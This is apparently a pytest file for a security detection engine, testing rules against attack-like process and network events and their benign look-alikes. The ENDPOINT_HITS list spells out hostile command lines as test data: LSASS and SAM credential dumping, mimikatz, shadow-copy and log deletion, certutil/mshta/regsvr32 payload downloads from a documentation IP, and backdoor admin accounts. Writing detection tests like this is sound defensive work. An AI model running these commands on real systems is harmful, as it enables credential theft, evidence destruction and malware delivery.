"""The extended rule pack: one firing case and one near-miss (benign look-alike) per rule."""

from __future__ import annotations

import pytest
from test_detection import auth, ingest, row, rule_alerts

from app.detection.registry import CATEGORIES, default_rules
from app.domain.enums import Severity
from app.ingestion.iocs import load_iocs


def proc(seconds: int, command: str, *, name: str | None = None, parent="explorer.exe", **kw):
    image = name or command.split()[0]
    return row(
        seconds,
        event_type="process",
        host=kw.pop("host", "WS-01"),
        user=kw.pop("user", "eve"),
        process_name=image,
        parent_process=parent,
        command_line=command,
        **kw,
    )


def net(seconds: int, dst_ip: str, dst_port: int, src_ip: str = "10.0.0.5", **kw):
    return row(
        seconds,
        event_type="network",
        host="WS-01",
        src_ip=src_ip,
        dst_ip=dst_ip,
        dst_port=dst_port,
        **kw,
    )


def test_every_rule_has_metadata_and_unique_id():
    rules = default_rules()
    assert len(rules) >= 20
    assert len({r.rule_id for r in rules}) == len(rules)
    for rule in rules:
        assert rule.category in CATEGORIES, rule.rule_id
        assert rule.title and rule.description
        assert set(rule.config_help) == set(rule.default_config), rule.rule_id
        assert all(m.startswith("T") for m in rule.mitre), rule.rule_id


# --- authentication --------------------------------------------------------------------------


def test_distributed_brute_force(ctx):
    ingest(ctx, [auth(i * 30, "failure", ip=f"198.51.100.{i}") for i in range(4)])
    (alert,) = rule_alerts(ctx, "auth.distributed_brute_force")
    assert alert.event_count == 4 and "4 source IPs" in alert.title


def test_distributed_brute_force_needs_distinct_sources(ctx):
    ingest(ctx, [auth(i * 30, "failure", ip="198.51.100.1") for i in range(6)])
    assert not rule_alerts(ctx, "auth.distributed_brute_force")


def test_success_from_ioc(ctx):
    load_iocs(ctx.iocs, b"indicator,type,source\n203.0.113.45,ip,test\n")
    ingest(ctx, [auth(0, "failure"), auth(10, "success")])
    (alert,) = rule_alerts(ctx, "auth.success_from_ioc")
    assert alert.severity is Severity.HIGH and alert.event_count == 1


def test_success_from_ioc_ignores_failures_and_unlisted(ctx):
    load_iocs(ctx.iocs, b"indicator,type,source\n203.0.113.45,ip,test\n")
    ingest(ctx, [auth(0, "failure"), auth(10, "success", ip="203.0.113.46")])
    assert not rule_alerts(ctx, "auth.success_from_ioc")


# --- endpoint --------------------------------------------------------------------------------

ENDPOINT_HITS = [
    ("process.credential_dumping", "procdump64.exe -accepteula -ma lsass.exe C:\\t\\l.dmp"),
    (
        "process.credential_dumping",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full",
    ),
    ("process.credential_dumping", "reg.exe save HKLM\\SAM C:\\t\\sam.save"),
    ("process.credential_dumping", 'mimikatz.exe "sekurlsa::logonpasswords" exit'),
    ("process.inhibit_recovery", "vssadmin.exe delete shadows /all /quiet"),
    ("process.inhibit_recovery", "wmic.exe shadowcopy delete"),
    ("process.inhibit_recovery", "bcdedit.exe /set {default} recoveryenabled No"),
    ("process.log_clearing", "wevtutil.exe cl Security"),
    ("process.log_clearing", "powershell.exe -c Clear-EventLog -LogName System"),
    ("process.log_clearing", "rm -rf /var/log/auth.log"),
    ("process.lolbin_abuse", "certutil.exe -urlcache -split -f http://198.51.100.9/p.exe p.exe"),
    ("process.lolbin_abuse", "bitsadmin.exe /transfer j http://198.51.100.9/p.exe C:\\p.exe"),
    ("process.lolbin_abuse", "mshta.exe http://198.51.100.9/run.hta"),
    ("process.lolbin_abuse", "regsvr32.exe /s /n /u /i:http://198.51.100.9/x.sct scrobj.dll"),
    ("process.persistence", 'schtasks.exe /create /tn Updater /tr "C:\\u.exe" /sc onlogon'),
    (
        "process.persistence",
        "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v u /d C:\\u.exe",
    ),
    ("process.persistence", "sc.exe create evil binPath= C:\\e.exe"),
    ("process.account_manipulation", "net.exe user backdoor P@ssw0rd! /add"),
    ("process.account_manipulation", "net.exe localgroup administrators backdoor /add"),
    ("process.account_manipulation", "usermod -aG sudo backdoor"),
]

ENDPOINT_BENIGN = [
    "procdump64.exe -ma chrome.exe C:\\t\\c.dmp",
    "vssadmin.exe list shadows",
    "wevtutil.exe qe Security /c:5",
    "certutil.exe -hashfile C:\\setup.exe SHA256",
    "schtasks.exe /query /fo LIST",
    "reg.exe query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "net.exe user alice /domain",
    "net.exe localgroup administrators",
    "notepad.exe C:\\Users\\Public\\notes.txt",
]


@pytest.mark.parametrize(("rule_id", "command"), ENDPOINT_HITS)
def test_endpoint_rule_fires(ctx, rule_id, command):
    ingest(ctx, [proc(0, command)])
    (alert,) = rule_alerts(ctx, rule_id)
    assert alert.event_count == 1 and "WS-01" in alert.title


@pytest.mark.parametrize("command", ENDPOINT_BENIGN)
def test_endpoint_rules_ignore_benign_lookalikes(ctx, command):
    ingest(ctx, [proc(0, command)])
    assert ctx.alerts.count() == 0, [a.rule_id for a in ctx.alerts.list()]


def test_endpoint_matches_on_one_host_share_an_alert(ctx):
    ingest(
        ctx,
        [
            proc(0, "vssadmin.exe delete shadows /all /quiet"),
            proc(60, "wbadmin delete catalog -quiet"),
        ],
    )
    (alert,) = rule_alerts(ctx, "process.inhibit_recovery")
    assert alert.event_count == 2 and alert.severity is Severity.CRITICAL


def test_office_child_shell(ctx):
    ingest(
        ctx,
        [
            proc(
                0, "powershell.exe -nop -c whoami", parent="C:\\Program Files\\Office\\WINWORD.EXE"
            ),
            proc(5, "cmd.exe /c dir", parent="explorer.exe"),
            proc(9, "chrome.exe https://example.com", parent="outlook.exe"),
        ],
    )
    (alert,) = rule_alerts(ctx, "process.office_child_shell")
    assert alert.event_count == 1
    (link,) = ctx.alerts.events_for(alert.alert_id)
    assert "winword.exe -> powershell.exe" in link.reason


def test_discovery_burst_needs_distinct_commands_in_window(ctx):
    ingest(
        ctx,
        [
            proc(0, "whoami.exe /all"),
            proc(30, 'net.exe group "Domain Admins" /domain'),
            proc(60, "nltest.exe /dclist:corp"),
            proc(90, "whoami.exe"),
        ],
    )
    (alert,) = rule_alerts(ctx, "process.discovery_burst")
    assert alert.event_count == 4 and "3 discovery commands" in alert.title


def test_discovery_burst_ignores_repeats_and_spread_out_commands(ctx):
    ingest(
        ctx,
        [proc(i * 10, "whoami.exe") for i in range(5)]
        + [proc(3600, "ipconfig /all"), proc(7200, "systeminfo")],
    )
    assert not rule_alerts(ctx, "process.discovery_burst")


# --- network ---------------------------------------------------------------------------------


def test_port_scan(ctx):
    ingest(ctx, [net(i, "10.0.0.20", 1000 + i) for i in range(20)])
    (alert,) = rule_alerts(ctx, "network.port_scan")
    assert alert.event_count == 20


def test_port_scan_ignores_repeated_connections(ctx):
    ingest(ctx, [net(i, "10.0.0.20", 443) for i in range(40)])
    assert not rule_alerts(ctx, "network.port_scan")


def test_lateral_movement_fan_out(ctx):
    ingest(ctx, [net(i * 30, f"10.0.1.{i}", 445) for i in range(5)])
    (alert,) = rule_alerts(ctx, "network.lateral_movement")
    assert alert.severity is Severity.HIGH and "5 internal hosts" in alert.title


def test_lateral_movement_ignores_web_and_external(ctx):
    ingest(
        ctx,
        [net(i * 30, f"10.0.1.{i}", 443) for i in range(6)]
        + [net(i * 30, f"198.51.100.{i}", 3389) for i in range(6)],
    )
    assert not rule_alerts(ctx, "network.lateral_movement")


def test_suspicious_port_public_only(ctx):
    ingest(
        ctx, [net(0, "198.51.100.7", 4444), net(5, "10.0.0.9", 4444), net(9, "198.51.100.7", 443)]
    )
    (alert,) = rule_alerts(ctx, "network.suspicious_port")
    assert alert.event_count == 1 and "Metasploit" in alert.explanation


def test_large_upload_sums_bytes_in_window(ctx):
    chunk = 30 * 1024 * 1024
    ingest(ctx, [net(i * 60, "198.51.100.50", 443, bytes_out=chunk) for i in range(4)])
    (alert,) = rule_alerts(ctx, "network.large_upload")
    assert alert.event_count == 4 and "120.0 MB" in alert.title


def test_large_upload_ignores_internal_and_small(ctx):
    big = 500 * 1024 * 1024
    ingest(
        ctx, [net(0, "10.0.0.50", 445, bytes_out=big), net(5, "198.51.100.50", 443, bytes_out=1000)]
    )
    assert not rule_alerts(ctx, "network.large_upload")


def test_new_rules_are_configurable_and_rescan_safe(ctx):
    ingest(ctx, [proc(0, "whoami.exe"), proc(10, "ipconfig /all")])
    assert not rule_alerts(ctx, "process.discovery_burst")
    ctx.detection.configure(
        "process.discovery_burst",
        enabled=True,
        config={"distinct_commands": 2, "window_seconds": 600},
    )
    ctx.detection.rescan()
    ctx.detection.rescan()
    assert len(rule_alerts(ctx, "process.discovery_burst")) == 1
